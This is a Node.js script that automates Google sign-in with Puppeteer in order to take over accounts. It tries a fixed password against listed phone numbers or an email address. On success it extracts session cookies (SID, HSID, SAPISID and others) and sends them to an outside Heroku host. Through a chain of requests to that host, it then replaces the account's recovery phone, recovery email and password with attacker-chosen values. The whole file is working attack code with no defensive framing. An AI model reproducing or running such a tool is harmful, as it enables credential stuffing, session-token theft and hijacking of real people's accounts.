const puppeteer = require('./puppeteer/Puppeteer')
const request = require('request')
const crypto = require('crypto')

let mLoadSuccess = false
let mLoad = false
let mSearch = false
let page = null
let mPasswordTry = []

mPasswordTry['server01'] = 0
mPasswordTry['server02'] = 0
mPasswordTry['server03'] = 0
mPasswordTry['server04'] = 0

let mList = [
    '+8801701033238',
    '+8801701033329',
    '+8801701034415',
    '+8801701034865',
    '+8801701034892',
    '+8801701035307',
    '+8801701035530',
    '+8801701035542',
    '+8801701039721',
    '+8801701039796',
    '+8801701040236',
    '+8801701040341',
    '+8801701040345',
    '+8801701040590',
    '+8801701040914',
    '+8801701041774',
    '+8801701043159',
    '+8801701043215',
    '+8801701045126',
    '+8801701047438',
    '+8801701047465',
    '+8801701083870',
    '+8801701084132',
    '+8801701084156',
    '+8801701084356',
    '+8801701084514',
    '+8801701085212',
    '+8801701085346',
    '+8801701085595',
    '+8801701087126'
]


;(async () => {

    let browser = await puppeteer.launch({
        headless: true,
        args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
    })

    page = await browser.newPage()

    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3193.0 Safari/537.36')

    page.on('request', async request => {

        if(!mLoad) {
            let check = await exits('div.Y4dIwd > span')
            if(check) {
                check = await page.evaluate((number) => { 
                    let root = document.querySelector('input[type="email"]'); 
                    if(root) {
                        root.value = number
                        return true 
                    }
                }, number)

                if(check) {
                    mLoad = true
                    //mLoad = await click('#identifierNext')
                }
            }
        }

    })

    await page.goto('https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&rip=1&nojavascript=1&ifkv=AX3vH3_8OID3jcdWI28sWhLKyWZfo4meEPPnetcotLVnH3ejfs06Wk_CtNS4zazcrE3kC6LvY3Qy&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en-US&service=accountsettings')

    mLoadSuccess = true

    //await checkNumber('+8801772007987')
    //await checkNumber('+8801701034865')

    checkNumber('01705177az@gmail.com', '$123456$')

})()


async function checkNumber(number, password) {
    console.log(new Date().getTime())
    let Identifier = await getIdentifierData(number)

    //console.log(Identifier)

    request({
        url: 'https://egfhoeiyhq6734r1.herokuapp.com/login',
        method: 'POST',
        json: true,
        body: { 'number' : number, 'identify' : Identifier}
    }, function(error, responce, body) {
        console.log(body)
        if(body) {
            tryPassword(password, body, Identifier, 0)
        }
    })
}

function tryPassword(number, TL, Identifier, loop) {
    let pass = number
    /*if(loop == 1) {
        pass = number.substring(0, 8)
    } else if(loop == 2) {
        pass = number.substring(number.length-8, number.length)
    }*/

    request({
        url: 'https://accounts.google.com/_/signin/challenge?hl=en&TL='+TL+'&_reqid=999999',
        method: 'POST',
        body: getPasswordData(pass, Identifier),
        headers: {
            'Cookie': '__Host-GAPS=1:K1YZWPO-7rwTZroM2a1_7P5JH9kIJ--uXKz4ecTXNNGDyMSsdW2LB9PncggC_11788hiZhQ5a4AwCGjMAThDUavK5BcBDoUp57jktAFPTm4_mWq2CT-u2nNT_cvvHA:NM9lHMofYMqVL9qd',
            'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf' : 1
        }
    }, function(error, responce, body) {
        console.log(body)
        if(loop == 0) {
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][3] == 5) {
                    console.log('Wrong Password')
                    /*if(loop == 0) {
                        tryPassword(password, TL, Token, Identifier, type, 1)
                    } else if(loop == 1) {
                        tryPassword(password, TL, Token, Identifier, type, 2)
                    }*/
                } else if(data[0][3] == 3) {
                    request({
                        url: 'https://accounts.google.com//_/signin/selectchallenge?hl=en&TL='+TL+'&_reqid=999999',
                        method: 'POST',
                        body: 'f.req=%5B5%2Cnull%2Cnull%2Cnull%2C%5B12%5D%5D',
                        headers: {
                            'Cookie': '__Host-GAPS=1:K1YZWPO-7rwTZroM2a1_7P5JH9kIJ--uXKz4ecTXNNGDyMSsdW2LB9PncggC_11788hiZhQ5a4AwCGjMAThDUavK5BcBDoUp57jktAFPTm4_mWq2CT-u2nNT_cvvHA:NM9lHMofYMqVL9qd',
                            'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
                            'google-accounts-xsrf' : 1
                        }
                    }, function(error, responce, body) {
                        //console.log(body)
                        console.log(body)
    
                        request({
                            url: 'https://accounts.google.com/_/signin/challenge?hl=en&TL='+TL+'&_reqid=999999',
                            method: 'POST',
                            body: getRecoveryData('999999@gmail.com', Identifier, 1),
                            headers: {
                                'Cookie': '__Host-GAPS=1:K1YZWPO-7rwTZroM2a1_7P5JH9kIJ--uXKz4ecTXNNGDyMSsdW2LB9PncggC_11788hiZhQ5a4AwCGjMAThDUavK5BcBDoUp57jktAFPTm4_mWq2CT-u2nNT_cvvHA:NM9lHMofYMqVL9qd',
                                'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
                                'google-accounts-xsrf' : 1
                            }
                        }, function(error, responce, body) {
                            //console.log(body)
                            console.log(body)
                        })
                    })
                } else if(data[0][3] == 1){
                    
                    let cookiesList = responce.headers['set-cookie']
    
                    let sendCookies = {}
    
                    for(let i=0; i<cookiesList.length; i++) {
                        let singelData = cookiesList[i]
                        try {
                            let start = singelData.indexOf('=')
                            let end = singelData.indexOf(';')
                            let key = singelData.substring(0, start)
                            if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
                                let value = singelData.substring(start+1, end)
                                if(key == '__Secure-1PSID') {
                                    sendCookies['PSID'] = value
                                } else {
                                    sendCookies[key] = value
                                }
                            }
                        } catch (e) {}
                    }
    
                    request({
                        url: 'https://egfhoeiyhq6734r1.herokuapp.com/rescuephone',
                        method: 'POST',
                        json: true,
                        body: sendCookies
                    }, function(error, responce, body) {
                        console.log(body)
                        if (body) {
                            sendCookies['RART'] = body
                            request({
                                url: 'https://egfhoeiyhq6734r1.herokuapp.com/raptLogin',
                                method: 'POST',
                                json: true,
                                body: sendCookies
                            }, function(error, responce, body) {
                                console.log(body)
                                if(body) {
                                    tryPassword(pass, body, Identifier, 1)
                                }
                            })
                        }
                    })
                }
            } catch (e) {}
        } else if(loop == 1) {
            //console.log(responce.headers['set-cookie'])
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][3] == 1) {
                    let url = decodeURIComponent(data[0][13][2])
                    let token = null
                    if(url.includes('rapt=')) {
                        let start = url.indexOf('rapt=')
                        token = url.substring(start+5, url.length)
                        if(token.includes('&')) {
                            token = token.substring(0, token.indexOf('&'))
                        }
                    }

                    console.log('rapt', token)

                    let cookiesList = responce.headers['set-cookie']
    
                    let sendCookies = {}
    
                    for(let i=0; i<cookiesList.length; i++) {
                        let singelData = cookiesList[i]
                        try {
                            let start = singelData.indexOf('=')
                            let end = singelData.indexOf(';')
                            let key = singelData.substring(0, start)
                            if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID') {
                                let value = singelData.substring(start+1, end)
                                if(key == '__Secure-1PSID') {
                                    sendCookies['PSID'] = value
                                } else {
                                    sendCookies[key] = value
                                }
                            }
                        } catch (e) {}
                    }
    
                    request({
                        url: 'https://egfhoeiyhq6734r1.herokuapp.com/CheckCookie',
                        method: 'POST',
                        json: true,
                        body: sendCookies
                    }, function(error, responce, body) {
                        console.log(body)
                        if(body) {
                            sendCookies['OSIDT'] = body
                            request({
                                url: 'https://egfhoeiyhq6734r1.herokuapp.com/osid',
                                method: 'POST',
                                json: true,
                                body: sendCookies
                            }, function(error, responce, body) {
                                console.log(body)
                                if(body) {
                                    sendCookies['OSID'] = body
                                    sendCookies['RAPT'] = token
                                    sendCookies['NUMBER'] = '+8801303268944'
                                    sendCookies['GMAIL'] = '88888888@gmail.com'
                                    sendCookies['PASSWORD'] = '$112233$'
                                    request({
                                        url: 'https://egfhoeiyhq6734r1.herokuapp.com/phone',
                                        method: 'POST',
                                        json: true,
                                        body: sendCookies
                                    }, function(error, responce, body) {
                                        console.log(body)
                                        if(body) {
                                            request({
                                                url: 'https://egfhoeiyhq6734r1.herokuapp.com/recovery',
                                                method: 'POST',
                                                json: true,
                                                body: sendCookies
                                            }, function(error, responce, body) {
                                                console.log(body)
                                                if(body) {
                                                    request({
                                                        url: 'https://egfhoeiyhq6734r1.herokuapp.com/verification',
                                                        method: 'POST',
                                                        json: true,
                                                        body: sendCookies
                                                    }, function(error, responce, body) {
                                                        console.log(body)
                                                        if(body) {
                                                            request({
                                                                url: 'https://egfhoeiyhq6734r1.herokuapp.com/password',
                                                                method: 'POST',
                                                                json: true,
                                                                body: sendCookies
                                                            }, function(error, responce, body) {
                                                                console.log(body)
                                                                
                                                            })
                                                        }
                                                    })
                                                }
                                            })
                                        }
                                    })
                                }
                            })
                        }
                        
                    })
                }
            } catch (e) {}
        }
    })
}

function getNumberData(number, identify) {
    return 'f.req='+encodeURIComponent(JSON.stringify([number,"AEThLlzLnodznP_eS7-mfzAihkXlpSKvoxliHZlPZE7W1-NMXK50YUORqG5WNyxwLONQwZwBsK1p-PH7BHW4s-NEZhzTMrxrdQHlqhB6bpzNema_MyohPW-JaUv-EO7_qbvIYnlKdIu0JkSGy2tJbRiElFWhzHXi1UJK1nt4D8UbHnOux-lF7PC0_RlISAgrI1oOSktxWO1I",[],null,null,null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?service=accountsettings&hl=en-US&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&csig=AF-SEnY7bxxtADWhtFc_%3A1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin",null,[],4,[],"GlifWebSignIn",null,[],false],1,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,true,null,null,null,null,null,null,null,null,[]],number,null,null,null,true,true,[]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",identify]))
}

function getPasswordData(password, identify) {
    return 'f.req='+encodeURIComponent(JSON.stringify(['AEThLlyOYELOmWxuUa1a9zrw-W1lgBb4B8MatdRKV_Qc_kthvi0el-j_7BCcmUfykrcdngQIczHSK0Z3U_QDFqnH7QkZjzOJaIqsz3m5T6kdiv4lD_IynbRWQ-W5TwDOT1PfXdV6_i1SX7eM2ScP69jYRYGkAUVjJLJg7XwNcVFhrVD-nzOAhWgYMBD_PPj6DmD7U_m41MTNhgRB2rnFgr4gwQLRk_nEa8zPSzAB9PLFljG8HvHFrklXFsjw_LmAwytbJIJok90Qq11cicspGBmnEU0t5YE2gt1MGBHqy3hucdSCvlcrxfYQJavNEWnChvUN7L1QaX_oM5S5ywQkBYcXucLdO-DG3IIAG11l3P_n7f_YLQq6ZeaDrS1gAhB9y4rJLVXjuUHG9GiauRvTk9iuI9uGtF-pNaSZTvkIjTON9lb_9l1iyBmpf8lcuC2sCzszgV9wNOyOT92DSfKmA3T8JZc53hd-nsnk-teJst1pSh_FgonwQQzMWAMKGTkF_GyuVu6NYxcyUxd5Fu2gLPEaol2WWzm7jA',null,1,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",identify]))
}

function getRecoveryData(gmail, identify, type) {
    return 'continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(["AEThLlzLnodznP_eS7-mfzAihkXlpSKvoxliHZlPZE7W1-NMXK50YUORqG5WNyxwLONQwZwBsK1p-PH7BHW4s-NEZhzTMrxrdQHlqhB6bpzNema_MyohPW-JaUv-EO7_qbvIYnlKdIu0JkSGy2tJbRiElFWhzHXi1UJK1nt4D8UbHnOux-lF7PC0_RlISAgrI1oOSktxWO1I",null,5,null,[12,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[gmail]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",identify]))
}

async function getIdentifierData(number) {
    let responce = null
    while(true) {
        if(!mSearch) {
            mSearch = true
            responce = getIdentifier(number)
            if(responce) {
                mSearch = false
                break
            }
        }
    }
    return responce
}

async function getIdentifier(number) {
    if(page != null && mLoadSuccess) {
        return await page.evaluate(async (number) => {
            let root = document.querySelector('#Email')
            if(root) {
                root.value = number
                try {
                    return document.bg.low(function(response) {
                        return response
                    })
                } catch (err) {}
            }
            return null
        }, number)
    } else {
        return null
    }
}


async function click(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            root.click()
            return true
        } else {
            return false
        }
    }, id)
    return output
}

async function exits(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            return true
        } else {
            return false
        }
    }, id)
    return output
}